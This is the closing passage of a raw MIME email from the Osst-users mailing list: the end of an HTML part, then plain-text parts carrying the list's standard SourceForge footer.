able></div>
<div>&nbsp;</div></div></div></div></div></div></div></div></div></body></h=
tml>


--===============2088161733199364462==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2088161733199364462==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============2088161733199364462==--
